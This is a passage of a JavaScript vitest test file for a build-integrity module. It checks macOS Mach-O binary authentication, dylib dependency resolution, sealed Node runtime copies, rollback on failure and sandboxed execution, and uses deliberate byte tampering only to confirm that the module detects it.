import { describe, expect, it, vi } from "vitest";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { createHash } from "node:crypto";
import { chmodSync, closeSync, copyFileSync, existsSync, linkSync, lstatSync, mkdirSync, mkdtempSync, openSync, readFileSync, readdirSync, realpathSync, renameSync, rmSync, statSync, symlinkSync, unlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { createServer } from "node:http";
import { basename, delimiter, dirname, join } from "node:path";
import { pathToFileURL } from "node:url";
import { Writable } from "node:stream";
import {
  authenticateSealedMachOPayload,
  captureExactRegularFileIdentity,
  authenticateMachODylibIdSlices,
  bytePin,
  commandWordAuthoritySha256,
  createPinnedFreshBuildSandboxProfile,
  createPinnedGraphAuthoringNetworkProfile,
  createPinnedGraphAuthoringLauncherScript,
  createPinnedGraphAuthoringExecPolicy,
  createPinnedProviderWrapperScript,
  discoverNonSystemMachODependencies,
  expandMachORuntimePath,
  inventoryRegularArtifactTree,
  isFixedSystemGit,
  parseOtoolLibraryDependencies,
  parseOtoolLibraryDependencySections,
  parseOtoolDylibId,
  parseOtoolRpaths,
  pipeByteChunks,
  pinUniqueBytes,
  pinnedBuffersInFileOrder,
  pinnedSequenceSha256,
  readCommittedGitBytes,
  readCommittedGitInventory,
  readGitCommitTree,
  rejectAncestorCargoConfiguration,
  requireExactSealedMachOSections,
  requireIdenticalMachODependencySlices,
  resolveMachORpathDependency,
  resolvePinnedXcodeTool,
  restoreDirectoryWritesSync,
  sanitizeElectronBootstrapEnvironment,
  sealMachORuntimeCopies,
  settleMediaCompletion,
  settleBeforeDeadline,
  validatePinnedGraphAuthoringCommands,
  verifyRepositoryGitAuthority,
  verifyPinnedByteInventory,
} from "../scripts/evidence-capture-integrity.mjs";

const PINNED_RG = "/private/var/folders/[redacted]/runtime/rg";
const RAW_PINNED_RG = "/private/var/folders/ab/run-authority/T/runtime/rg";
const PINNED_RG_SHA256 = createHash("sha256").update(RAW_PINNED_RG).digest("hex");
const PINNED_SED = "/private/var/folders/[redacted]/runtime/sed";
const RAW_PINNED_SED = "/private/var/folders/ab/run-authority/T/runtime/sed";
const INSPECTION_ROOT = "/private/var/folders/[redacted]/runtime/graph-client";
const RAW_INSPECTION_ROOT = "/private/var/folders/ab/run-authority/T/runtime/graph-client";
const GRAPH_AUTHORING_LAUNCHER = "/private/var/folders/[redacted]/runtime/graph-authoring-launcher";
const RAW_GRAPH_AUTHORING_LAUNCHER = "/private/var/folders/ab/run-authority/T/runtime/graph-authoring-launcher";
const GRAPH_AUTHORING_LAUNCHER_SHA256 = createHash("sha256").update(RAW_GRAPH_AUTHORING_LAUNCHER).digest("hex");
const pinnedGraphCommand = (body = "") => `${JSON.stringify(GRAPH_AUTHORING_LAUNCHER)} <<'EOF'\n${body}\nEOF`;
const homebrewNodeRoot = "/opt/homebrew/Cellar/node";
const multiplyLinkedHomebrewNode = process.platform === "darwin" && existsSync(homebrewNodeRoot)
  ? readdirSync(homebrewNodeRoot).map((version) => join(homebrewNodeRoot, version, "bin", "node"))
    .find((path) => existsSync(path) && statSync(path).nlink > 1)
  : undefined;
const posixMkfifo = process.platform === "win32"
  ? undefined
  : ["/usr/bin/mkfifo", "/bin/mkfifo"].find((path) => existsSync(path));

function findTestExecutable(name) {
  const extensions = process.platform === "win32"
    ? (process.env.PATHEXT ?? ".EXE;.CMD;.BAT;.COM").split(";")
    : [""];
  for (const directory of (process.env.PATH ?? "").split(delimiter).filter(Boolean)) {
    for (const extension of extensions) {
      const candidate = join(directory, `${name}${extension}`);
      if (existsSync(candidate)) return realpathSync(candidate);
    }
  }
  return undefined;
}

const testGitPath = process.platform === "darwin" && existsSync("/usr/bin/git") ? "/usr/bin/git" : undefined;
const testArchivePath = findTestExecutable("tar");

function supportsFileSymlinks() {
  const directory = mkdtempSync(join(tmpdir(), "relayer-symlink-capability-"));
  try {
    const target = join(directory, "target");
    const link = join(directory, "link");
    writeFileSync(target, "target\n");
    symlinkSync(target, link, "file");
    return lstatSync(link).isSymbolicLink();
  } catch {
    return false;
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
}

const fileSymlinksSupported = supportsFileSymlinks();

function expandFirstMachOLoadCommandRegion(bytes) {
  const fatMagic = bytes.readUInt32BE(0);
  const sliceOffset = fatMagic === 0xcafebabf ? Number(bytes.readBigUInt64BE(16))
    : fatMagic === 0xcafebabe ? bytes.readUInt32BE(16) : 0;
  let lastCommand = sliceOffset + 32;
  const commandCount = bytes.readUInt32LE(sliceOffset + 16);
  for (let commandIndex = 0; commandIndex < commandCount - 1; commandIndex += 1) {
    lastCommand += bytes.readUInt32LE(lastCommand + 4);
  }
  bytes.writeUInt32LE(bytes.readUInt32LE(lastCommand + 4) + 8, lastCommand + 4);
  bytes.writeUInt32LE(bytes.readUInt32LE(sliceOffset + 20) + 8, sliceOffset + 20);
}

function flipFirstMachOLinkeditByte(bytes) {
  const fatMagic = bytes.readUInt32BE(0);
  const sliceOffset = fatMagic === 0xcafebabf ? Number(bytes.readBigUInt64BE(16))
    : fatMagic === 0xcafebabe ? bytes.readUInt32BE(16) : 0;
  let command = sliceOffset + 32;
  const commandCount = bytes.readUInt32LE(sliceOffset + 16);
  for (let commandIndex = 0; commandIndex < commandCount; commandIndex += 1) {
    const commandKind = bytes.readUInt32LE(command);
    const commandSize = bytes.readUInt32LE(command + 4);
    if (commandKind === 0x19
      && bytes.subarray(command + 8, command + 24).toString("ascii").replace(/\0.*$/, "") === "__LINKEDIT") {
      const fileOffset = Number(bytes.readBigUInt64LE(command + 40));
      bytes[sliceOffset + fileOffset + 16] ^= 1;
      return;
    }
    command += commandSize;
  }
  throw new Error("Test Mach-O has no __LINKEDIT segment.");
}

function authenticatedInspectionAction(command, rawCommand = command
  .replaceAll(PINNED_SED, RAW_PINNED_SED)
  .replaceAll(PINNED_RG, RAW_PINNED_RG)
  .replaceAll(INSPECTION_ROOT, RAW_INSPECTION_ROOT)) {
  const hashes = commandWordAuthoritySha256(rawCommand);
  return {
    command,
    ...(rawCommand.startsWith("/") ? { relayerExecutableAuthoritySha256: hashes?.[0] } : {}),
    relayerCommandWordAuthoritySha256: hashes,
  };
}

const inspectionAuthority = {
  allowedInspectionRoots: [INSPECTION_ROOT],
  allowedInspectionRawRoots: [RAW_INSPECTION_ROOT],
  allowedSedExecutable: PINNED_SED,
  allowedSedExecutableSha256: createHash("sha256").update(RAW_PINNED_SED).digest("hex"),
  allowedRipgrepExecutable: PINNED_RG,
  allowedRipgrepExecutableSha256: PINNED_RG_SHA256,
  requirePinnedGraph: false,
};
function validateEvidenceCommands(events, options = {}) {
  const allowedInspectionRoots = options.allowedInspectionRoots ?? [];
  const authenticatedEvents = events.map((event) => {
    const item = event?.data?.params?.item;
    if (!Array.isArray(item?.commandActions)) return event;
    return {
      ...event,
      data: { ...event.data, params: { ...event.data.params, item: {
        ...item,
        commandActions: item.commandActions.map((action) => (
          action.command?.includes(GRAPH_AUTHORING_LAUNCHER)
            ? { relayerGraphAuthoringLauncherSha256: GRAPH_AUTHORING_LAUNCHER_SHA256, ...action }
            : action
        )),
      } } },
    };
  });
  return validatePinnedGraphAuthoringCommands(authenticatedEvents, {
    allowedGraphAuthoringLauncher: GRAPH_AUTHORING_LAUNCHER,
    allowedGraphAuthoringLauncherSha256: GRAPH_AUTHORING_LAUNCHER_SHA256,
    allowedInspectionRawRoots: options.allowedInspectionRawRoots ?? allowedInspectionRoots,
    ...options,
  });
}

describe("evidence capture integrity", () => {
  it.runIf(process.platform !== "win32")("restores directory traversal before removing a read-only fresh source tree", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-readonly-cleanup-"));
    const source = join(directory, "source");
    const nested = join(source, "nested");
    const external = join(directory, "external");
    mkdirSync(nested, { recursive: true });
    mkdirSync(external);
    writeFileSync(join(nested, "artifact"), "immutable");
    symlinkSync(external, join(nested, "external-link"));
    chmodSync(external, 0o500);
    chmodSync(nested, 0o500);
    chmodSync(source, 0o500);
    const authorities = [nested, source].map((path) => {
      const details = lstatSync(path, { bigint: true });
      return { path, dev: details.dev, ino: details.ino };
    });
    try {
      expect(restoreDirectoryWritesSync(authorities)).toBe(true);
      expect(statSync(source).mode & 0o200).toBe(0o200);
      expect(statSync(nested).mode & 0o200).toBe(0o200);
      expect(statSync(external).mode & 0o200).toBe(0);
      rmSync(source, { recursive: true });
      expect(existsSync(source)).toBe(false);
    } finally {
      if (existsSync(source)) restoreDirectoryWritesSync(authorities);
      chmodSync(external, 0o700);
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it.runIf(process.platform !== "win32")("does not chmod a directory substituted for captured read-only authority", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-cleanup-substitution-"));
    const source = join(directory, "source");
    const moved = join(directory, "captured-source");
    mkdirSync(source);
    chmodSync(source, 0o500);
    const captured = lstatSync(source, { bigint: true });
    const authorities = [{ path: source, dev: captured.dev, ino: captured.ino }];
    renameSync(source, moved);
    mkdirSync(source);
    chmodSync(source, 0o500);
    try {
      expect(restoreDirectoryWritesSync(authorities)).toBe(false);
      expect(statSync(source).mode & 0o200).toBe(0);
    } finally {
      chmodSync(source, 0o700);
      chmodSync(moved, 0o700);
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("rejects a dependency substitution even when it remains inside the private runtime", () => {
    expect(() => requireExactSealedMachOSections({
      sourceSections: [{ architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib", "/opt/lib/libalpha.dylib"] }],
      sealedSections: [{ architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib", "@loader_path/libbeta.dylib"] }],
      sourceId: null,
      targetNames: new Set(["libalpha.dylib", "libbeta.dylib"]),
      targetName: "node",
    })).toThrow("differs from its authenticated source architecture");
    expect(() => requireExactSealedMachOSections({
      sourceSections: [{ architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib"] }],
      sealedSections: [
        { architecture: "arm64", dependencies: ["/usr/lib/libSystem.B.dylib"] },
        { architecture: "x86_64", dependencies: ["/usr/lib/libSystem.B.dylib"] },
      ],
      sourceId: null,
      targetNames: new Set(),
      targetName: "node",
    })).toThrow("matching architecture inventories");
  });

  it.runIf(process.platform === "darwin" && existsSync("/opt/homebrew/opt/node/bin/node"))(
    "rejects LC_MAIN, segment flags, and RPATH byte substitutions",
    () => {
      const source = readFileSync(realpathSync("/opt/homebrew/opt/node/bin/node"));
      const probes = [
        { command: 0x80000028, mutate: (bytes, offset) => bytes.writeBigUInt64LE(bytes.readBigUInt64LE(offset + 8) + 1n, offset + 8) },
        { command: 0x19, mutate: (bytes, offset) => bytes.writeUInt32LE(bytes.readUInt32LE(offset + 68) ^ 1, offset + 68) },
        { command: 0x8000001c, mutate: (bytes, offset) => { bytes[offset + bytes.readUInt32LE(offset + 8)] ^= 1; } },
      ];
      for (const probe of probes) {
        const mutated = Buffer.from(source);
        let offset = -1;
        for (let cursor = 0; cursor + 72 <= mutated.length; cursor += 4) {
          if (mutated.readUInt32LE(cursor) === probe.command) { offset = cursor; break; }
        }
        expect(offset, `missing load command ${probe.command.toString(16)}`).toBeGreaterThanOrEqual(0);
        probe.mutate(mutated, offset);
        expect(() => authenticateSealedMachOPayload(source, mutated)).toThrow(/load command|authority/);
      }
      const expanded = Buffer.from(source);
      expandFirstMachOLoadCommandRegion(expanded);
      expect(() => authenticateSealedMachOPayload(source, expanded)).toThrow(/command region|load command|code-signature|fixed header/);
      const shifted = Buffer.from(source);
      const fatMagic = shifted.readUInt32BE(0);
      const sliceOffset = fatMagic === 0xcafebabf ? Number(shifted.readBigUInt64BE(16))
        : fatMagic === 0xcafebabe ? shifted.readUInt32BE(16) : 0;
      const commandEnd = sliceOffset + 32 + shifted.readUInt32LE(sliceOffset + 20);
      let dylibCommand = sliceOffset + 32;
      while (dylibCommand < commandEnd && shifted.readUInt32LE(dylibCommand) !== 0xc) {
        dylibCommand += shifted.readUInt32LE(dylibCommand + 4);
      }
      expect(dylibCommand).toBeLessThan(commandEnd);
      const dylibSize = shifted.readUInt32LE(dylibCommand + 4);
      shifted.copy(shifted, dylibCommand + dylibSize + 8, dylibCommand + dylibSize, commandEnd);
      shifted.fill(0, dylibCommand + dylibSize, dylibCommand + dylibSize + 8);
      shifted.writeUInt32LE(dylibSize + 8, dylibCommand + 4);
      shifted.writeUInt32LE(shifted.readUInt32LE(sliceOffset + 20) + 8, sliceOffset + 20);
      expect(() => authenticateSealedMachOPayload(source, shifted)).toThrow(/dylib install name|load-command|command region/);
      let linkedit = -1;
      for (let cursor = 0; cursor + 72 <= source.length; cursor += 4) {
        if (source.readUInt32LE(cursor) === 0x19
          && source.subarray(cursor + 8, cursor + 24).toString("ascii").replace(/\0.*$/, "") === "__LINKEDIT") {
          linkedit = cursor;
          break;
        }
      }
      expect(linkedit).toBeGreaterThanOrEqual(0);
      for (const offset of [32, 48]) {
        const mutated = Buffer.from(source);
        mutated.writeBigUInt64LE(mutated.readBigUInt64LE(linkedit + offset) + (offset === 32 ? 0x100000n : 1n), linkedit + offset);
        expect(() => authenticateSealedMachOPayload(source, mutated)).toThrow(/__LINKEDIT sizes|segment bounds/);
      }
      const mutatedLinkedit = Buffer.from(source);
      flipFirstMachOLinkeditByte(mutatedLinkedit);
      expect(() => authenticateSealedMachOPayload(source, mutatedLinkedit)).toThrow("__LINKEDIT semantic payload differs");
    },
  );

  it.runIf(process.platform === "darwin" && existsSync("/opt/homebrew/opt/node/bin/node"))(
    "rejects fat alignment and FAT64 reserved-field substitutions",
    () => {
      const thin = readFileSync(realpathSync("/opt/homebrew/opt/node/bin/node"));
      const offset = 4096;
      const fat = Buffer.alloc(offset + thin.length);
      fat.writeUInt32BE(0xcafebabf, 0);
      fat.writeUInt32BE(1, 4);
      fat.writeUInt32BE(0x0100000c, 8);
      fat.writeUInt32BE(0, 12);
      fat.writeBigUInt64BE(BigInt(offset), 16);
      fat.writeBigUInt64BE(BigInt(thin.length), 24);
      fat.writeUInt32BE(12, 32);
      fat.writeUInt32BE(0, 36);
      thin.copy(fat, offset);
      expect(() => authenticateSealedMachOPayload(fat, fat)).not.toThrow();
      const badAlign = Buffer.from(fat);
      badAlign.writeUInt32BE(13, 32);
      expect(() => authenticateSealedMachOPayload(fat, badAlign)).toThrow(/alignment|fat Mach-O architecture authority/);
      const badReserved = Buffer.from(fat);
      badReserved.writeUInt32BE(1, 36);
      expect(() => authenticateSealedMachOPayload(fat, badReserved)).toThrow("fat Mach-O architecture authority");
    },
  );

  it.runIf(process.platform === "darwin")("rolls every target back after a late publication failure", () => {
    const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-seal-rollback-")));
    const otoolPath = resolvePinnedXcodeTool("otool");
    const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
    const sources = [realpathSync("/bin/echo"), realpathSync("/bin/cat")];
    const specs = sources.map((source, index) => {
      const target = join(directory, `tool-${index}`);
      copyFileSync(source, target);
      chmodSync(target, 0o700);
      return {
        source, target,
        sourceSha256: createHash("sha256").update(readFileSync(source)).digest("hex"),
        targetAuthority: captureExactRegularFileIdentity(target),
      };
    });
    const original = specs.map((spec) => ({
      digest: createHash("sha256").update(readFileSync(spec.target)).digest("hex"),
      identity: captureExactRegularFileIdentity(spec.target),
    }));
    try {
      expect(() => sealMachORuntimeCopies({
        sourceSpecs: specs,
        runtimeRoot: directory,
        rootExecutable: specs[0].target,
        otoolPath,
        installNameToolPath,
        afterTargetPublication: (target) => {
          const expanded = readFileSync(target);
          expandFirstMachOLoadCommandRegion(expanded);
          chmodSync(target, 0o700);
          writeFileSync(target, expanded);
          throw new Error("late validation failure after command-region substitution");
        },
      })).toThrow("late validation failure");
      for (const [index, spec] of specs.entries()) {
        expect(createHash("sha256").update(readFileSync(spec.target)).digest("hex")).toBe(original[index].digest);
        const restored = captureExactRegularFileIdentity(spec.target);
        expect([restored.dev, restored.ino]).toEqual([original[index].identity.dev, original[index].identity.ino]);
      }
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  }, 30_000);

  it.runIf(process.platform === "darwin")("rejects a resigned pre-signature __LINKEDIT substitution and rolls prior publications back", () => {
    const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-linkedit-rollback-")));
    const otoolPath = resolvePinnedXcodeTool("otool");
    const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
    const sources = [realpathSync("/bin/echo"), realpathSync("/bin/cat")];
    const specs = sources.map((source, index) => {
      const target = join(directory, `tool-${index}`);
      copyFileSync(source, target);
      chmodSync(target, 0o700);
      return {
        source, target,
        sourceSha256: createHash("sha256").update(readFileSync(source)).digest("hex"),
        targetAuthority: captureExactRegularFileIdentity(target),
      };
    });
    const originals = specs.map((spec) => ({
      bytes: readFileSync(spec.target),
      identity: captureExactRegularFileIdentity(spec.target),
    }));
    try {
      expect(() => sealMachORuntimeCopies({
        sourceSpecs: specs,
        runtimeRoot: directory,
        rootExecutable: specs[0].target,
        otoolPath,
        installNameToolPath,
        afterCodesign: (target, signScratch) => {
          if (target !== specs[1].target) return;
          const substituted = readFileSync(signScratch);
          flipFirstMachOLinkeditByte(substituted);
          writeFileSync(signScratch, substituted);
          execFileSync("/usr/bin/codesign", ["--force", "--sign", "-", signScratch], {
            env: { PATH: "/usr/bin:/bin", LANG: "C", LC_ALL: "C" },
          });
        },
      })).toThrow("__LINKEDIT semantic payload differs");
      for (const [index, spec] of specs.entries()) {
        expect(readFileSync(spec.target)).toEqual(originals[index].bytes);
        const restored = captureExactRegularFileIdentity(spec.target);
        expect([restored.dev, restored.ino]).toEqual([originals[index].identity.dev, originals[index].identity.ino]);
      }
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  }, 30_000);

  it.runIf(process.platform === "darwin")("resolves Xcode tools independently of hostile DEVELOPER_DIR", () => {
    const previous = process.env.DEVELOPER_DIR;
    process.env.DEVELOPER_DIR = join(tmpdir(), "hostile-developer-dir");
    try {
      const otool = resolvePinnedXcodeTool("otool");
      const installNameTool = resolvePinnedXcodeTool("install_name_tool");
      expect(otool).toContain("/Contents/Developer/");
      expect(installNameTool).toContain("/Contents/Developer/");
      expect(otool).not.toContain("hostile-developer-dir");
      expect(installNameTool).not.toContain("hostile-developer-dir");
    } finally {
      if (previous === undefined) delete process.env.DEVELOPER_DIR;
      else process.env.DEVELOPER_DIR = previous;
    }
  });

  it("parses and deduplicates structural multi-architecture otool sections", () => {
    const executable = "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/libtool";
    expect(parseOtoolLibraryDependencies([
      `${executable} (architecture x86_64):`,
      "\t/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 2000.66.0)",
      "\t@rpath/libprivate.dylib (compatibility version 1.0.0, current version 2.0.0, weak)",
      `${executable} (architecture arm64):`,
      "\t/usr/lib/libc++.1.dylib (compatibility version 1.0.0, current version 2000.66.0)",
      "\t@rpath/libprivate.dylib (compatibility version 1.0.0, current version 2.0.0, weak)",
      "",
    ].join("\n"), executable)).toEqual([
      "/usr/lib/libc++.1.dylib",
      "@rpath/libprivate.dylib",
    ]);
  });

  it("rejects divergent per-slice rpath resolution and accepts identical universal authority", () => {
    const executable = "/Applications/Example.app/Contents/MacOS/tool";
    const output = [
      `${executable} (architecture x86_64):`,
      "\t@rpath/libshared.dylib (compatibility version 1.0.0, current version 2.0.0)",
      `${executable} (architecture arm64):`,
      "\t@rpath/libshared.dylib (compatibility version 1.0.0, current version 2.0.0)",
      "",
    ].join("\n");
    const sections = parseOtoolLibraryDependencySections(output, executable);
    const rpaths = {
      x86_64: "/opt/x86_64/lib",
      arm64: "/opt/arm64/lib",
    };
    expect(() => requireIdenticalMachODependencySlices(sections, (dependency, architecture) => ({
      system: false,
      name: "libshared.dylib",
      source: `${rpaths[architecture]}/${basename(dependency)}`,
      sha256: "a".repeat(64),
    }))).toThrow("different runtime authority");

    expect(requireIdenticalMachODependencySlices(sections, (dependency) => ({
      system: false,
      name: "libshared.dylib",
      source: `/private/runtime/${basename(dependency)}`,
      sha256: "b".repeat(64),
    }))).toEqual([{
      dependency: "@rpath/libshared.dylib",
      system: false,
      name: "libshared.dylib",
      source: "/private/runtime/libshared.dylib",
      sha256: "b".repeat(64),
    }]);
  });

  it("parses only structural LC_RPATH commands from one selected architecture", () => {
    const executable = "/Applications/Example.app/Contents/MacOS/tool";
    expect(parseOtoolRpaths([
      `${executable}:`,
      "Load command 0",
      "          cmd LC_RPATH",
      "      cmdsize 48",
      "         path @loader_path/../lib (offset 12)",
      "Load command 1",
      "          cmd LC_LOAD_DYLIB",
      "         name /usr/lib/libSystem.B.dylib (offset 24)",
      "",
    ].join("\n"), executable)).toEqual(["@loader_path/../lib"]);
    expect(() => parseOtoolRpaths(`${executable}:\nLoad command 0\n cmd LC_RPATH\n`, executable))
      .toThrow("without a structural path");
  });

  it("authenticates a structural LC_ID_DYLIB and distinguishes executables", () => {
    const dylib = "/Applications/Example.app/Contents/Frameworks/libexample.dylib";
    expect(parseOtoolDylibId(`${dylib}:\n@rpath/libexample.dylib\n`, dylib)).toBe("@rpath/libexample.dylib");
    expect(parseOtoolDylibId(`${dylib}:\n`, dylib)).toBeNull();
    expect(() => parseOtoolDylibId(`${dylib}:\n@rpath/one.dylib\n@rpath/two.dylib\n`, dylib))
      .toThrow("malformed dylib ID");
  });

  it("authenticates versioned dylib IDs only when every slice resolves to the exact image bytes", () => {
    const directory = mkdtempSync(join(tmpdir(), "relayer-dylib-id-authority-"));
    const expectedSource = join(directory, "libactual.1.2.3.dylib");
    const wrongSource = join(directory, "libattacker.1.2.3.dylib");
    try {
      writeFileSync(expectedSource, "authenticated dylib bytes\n");
      writeFileSync(wrongSource, "different dylib bytes\n");
      const expectedSha256 = createHash("sha256").update(readFileSync(expectedSource)).digest("hex");
      const id = "@rpath/libactual.1.dylib";
      const sections = [
        { architecture: "x86_64", dependencies: [id, "/usr/lib/libSystem.B.dylib"] },
        { architecture: "arm64", dependencies: [id, "/usr/lib/libSystem.B.dylib"] },
      ];
      expect(authenticateMachODylibIdSlices({
        sections,
        dylibIds: [id, id],
        expectedSource,
        expectedSha256,
        resolveId: () => ({ source: expectedSource, sha256: expectedSha256 }),
      })).toBe(id);
      expect(() => authenticateMachODylibIdSlices({
        sections,
        dylibIds: [id, id],
        expectedSource,
        expectedSha256,
        resolveId: (_id, architecture) => ({
          source: architecture === "arm64" ? wrongSource : expectedSource,
          sha256: expectedSha256,
        }),
      })).toThrow("does not resolve to the authenticated image");
      expect(() => authenticateMachODylibIdSlices({
        sections,
        dylibIds: [id, null],
        expectedSource,
        expectedSha256,
        resolveId: () => ({ source: expectedSource, sha256: expectedSha256 }),
      })).toThrow("missing or different LC_ID_DYLIB");
      expect(() => authenticateMachODylibIdSlices({
        sections: sections.map((section) => ({ ...section, dependencies: ["/usr/lib/libSystem.B.dylib"] })),
        dylibIds: [id, id],
        expectedSource,
        expectedSha256,
        resolveId: () => ({ source: expectedSource, sha256: expectedSha256 }),
      })).toThrow("not present in its architecture dependency records");
    } finally {
      rmSync(directory, { recursive: true, force: true });
    }
  });

  it("rejects divergent nested parent run-path authority", () => {
    const dependency = "@rpath/libnested.dylib";
    const existing = new Set(["/parent-a/lib/libnested.dylib", "/parent-b/lib/libnested.dylib"]);
    const sections = [
      { architecture: "parent-a", dependencies: [dependency] },
      { architecture: "parent-b", dependencies: [dependency] },
    ];
    expect(() => requireIdenticalMachODependencySlices(sections, (installName, architecture) => {
      const source = resolveMachORpathDependency(installName, [`/${architecture}/lib`], (path) => existing.has(path));
      return { system: false, name: basename(installName), source, sha256: "c".repeat(64) };
    })).toThrow("different runtime authority");
  });

  it("expands executable and loader anchored Mach-O paths without a search fallback", () => {
    const authority = {
      loaderPath: "/Applications/Example.app/Contents/Frameworks/libloader.dylib",
      executablePath: "/Applications/Example.app/Contents/MacOS/tool",
    };
    expect(expandMachORuntimePath("@executable_path/../lib/", authority))
      .toBe("/Applications/Example.app/Contents/lib");
    expect(expandMachORuntimePath("@loader_path/Helpers", authority))
      .toBe("/Applications/Example.app/Contents/Frameworks/Helpers");
    expect(() => expandMachORuntimePath("relative/search/path", authority))
      .toThrow("Unsupported relative Mach-O runtime path");
  });

  it.runIf(process.platform === "darwin")("resolves every private Xcode ld dependency identically in both slices", () => {
    const executable = realpathSync(execFileSync("/usr/bin/xcrun", ["--find", "ld"], { encoding: "utf8" }).trim());
    const sections = parseOtoolLibraryDependencySections(
      execFileSync("/usr/bin/otool", ["-L", executable], { encoding: "utf8" }),
      executable,
    );
    const privateNames = ["libLTO.dylib", "libcodedirectory.dylib", "libswiftDemangle.dylib", "libtapi.dylib"];
    const resolvedByArchitecture = new Map();
    for (const section of sections) {
      const rpaths = parseOtoolRpaths(execFileSync("/usr/bin/otool", [
        "-l", "-arch", section.architecture, executable,
      ], { encoding: "utf8" }), executable).map((path) => expandMachORuntimePath(path, {
        loaderPath: executable,
        executablePath: executable,
      }));
      const resolved = Object.fromEntries(section.dependencies
        .filter((dependency) => dependency.startsWith("@rpath/"))
        .map((dependency) => {
          const name = basename(dependency);
          const source = rpaths.map((root) => join(root, name)).find(existsSync);
          expect(source).toBeDefined();
          return [name, realpathSync(source)];
        }));
      expect(Object.keys(resolved).sort()).toEqual(privateNames);
      resolvedByArchitecture.set(section.architecture, resolved);
    }
    expect(resolvedByArchitecture.get("arm64")).toEqual(resolvedByArchitecture.get("x86_64"));
  });

  it.runIf(process.platform === "darwin")("recursively authenticates the real Xcode ld Mach-O closure", () => {
    const executable = realpathSync(execFileSync("/usr/bin/xcrun", ["--find", "ld"], { encoding: "utf8" }).trim());
    const closure = discoverNonSystemMachODependencies({ executables: [executable], timeoutMs: 30_000 });
    expect(closure.map(([name]) => name)).toEqual([
      "libcodedirectory.dylib",
      "libLTO.dylib",
      "libswiftDemangle.dylib",
      "libtapi.dylib",
    ]);
    for (const [name, authority] of closure) {
      expect(basename(authority.source)).toBe(name);
      expect(authority.sha256).toMatch(/^[a-f0-9]{64}$/);
    }
  });

  it.runIf(process.platform === "darwin" && existsSync("/opt/homebrew/opt/zstd/lib/libzstd.1.dylib"))(
    "authenticates the real versioned Homebrew zstd dylib through its ABI symlink ID",
    () => {
      const stableAbiPath = "/opt/homebrew/opt/zstd/lib/libzstd.1.dylib";
      const executable = realpathSync(stableAbiPath);
      expect(discoverNonSystemMachODependencies({ executables: [executable], timeoutMs: 30_000 })).toEqual([]);
      const id = parseOtoolDylibId(execFileSync("/usr/bin/otool", ["-D", executable], { encoding: "utf8" }), executable);
      expect(id).toBe(stableAbiPath);
      expect(realpathSync(id)).toBe(executable);
    },
    30_000,
  );

  it.runIf(process.platform === "darwin" && existsSync("/opt/homebrew/opt/node/bin/node"))(
    "executes a sealed private Homebrew Node closure without external Homebrew reads",
    () => {
      const directory = realpathSync(mkdtempSync(join(tmpdir(), "relayer-sealed-node-runtime-")));
      const runtime = join(directory, "runtime");
      const scratch = join(directory, "scratch");
      const profile = join(directory, "node.sb");
      try {
        mkdirSync(runtime);
        mkdirSync(scratch);
        const sourceNode = realpathSync("/opt/homebrew/opt/node/bin/node");
        const otoolPath = resolvePinnedXcodeTool("otool");
        const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
        const sourceClosure = discoverNonSystemMachODependencies({ executables: [sourceNode], timeoutMs: 30_000, otoolPath });
        const sourceSpecs = [{ source: sourceNode, target: join(runtime, "node") }];
        for (const [name, authority] of sourceClosure) sourceSpecs.push({ source: authority.source, target: join(runtime, name) });
        for (const spec of sourceSpecs) {
          copyFileSync(spec.source, spec.target);
          chmodSync(spec.target, 0o700);
          spec.sourceSha256 = createHash("sha256").update(readFileSync(spec.source)).digest("hex");
          spec.targetAuthority = captureExactRegularFileIdentity(spec.target);
        }
        const sealedClosure = sealMachORuntimeCopies({
          sourceSpecs,
          runtimeRoot: runtime,
          rootExecutable: join(runtime, "node"),
          timeoutMs: 30_000,
          otoolPath,
          installNameToolPath,
        });
        expect(sealedClosure.map(([name]) => name)).toEqual(sourceClosure.map(([name]) => name));
        for (const spec of sourceSpecs) {
          const rewritten = execFileSync(otoolPath, ["-L", spec.target], {
            encoding: "utf8", env: { PATH: "/usr/bin:/bin", LANG: "C", LC_ALL: "C" },
          });
          expect(rewritten).not.toContain("/opt/homebrew/");
          for (const section of parseOtoolLibraryDependencySections(rewritten, spec.target)) {
            for (const dependency of section.dependencies) {
              expect(dependency.startsWith("/System/Library/") || dependency.startsWith("/usr/lib/")
                || dependency.startsWith("@loader_path/")).toBe(true);
            }
          }
        }
        writeFileSync(profile, createPinnedFreshBuildSandboxProfile({
          readPaths: [runtime, "/System/Library", "/System/Volumes/Preboot/Cryptexes/OS", "/usr/lib", "/dev", "/private/var/db/timezone"],
          writePaths: [scratch],
          executablePaths: [join(runtime, "node")],
        }));
        const execution = spawnSync("/usr/bin/sandbox-exec", [
          "-f", profile, join(runtime, "node"), "-e", "process.stdout.write('sealed-node-ok')",
        ], { encoding: "utf8", env: { PATH: "/usr/bin:/bin", LANG: "C", LC_ALL: "C", OPENSSL_CONF: "/dev/null" } });
        expect(execution.status, execution.stderr).toBe(0);
        expect(execution.stdout).toBe("sealed-node-ok");
      } finally {
        rmSync(directory, { recursive: true, force: true });
      }
    },
    30_000,
  );

  it.runIf(process.platform === "darwin" && existsSync("/opt/homebrew/opt/zstd/lib/libzstd.1.dylib"))(
    "detects authoritative target swaps after install-name and codesign calls",
    () => {
      const otoolPath = resolvePinnedXcodeTool("otool");
      const installNameToolPath = resolvePinnedXcodeTool("install_name_tool");
      const cases = [
        { source: realpathSync("/opt/homebrew/opt/zstd/lib/libzstd.1.dylib"), hook: "afterInstallNameTool" },
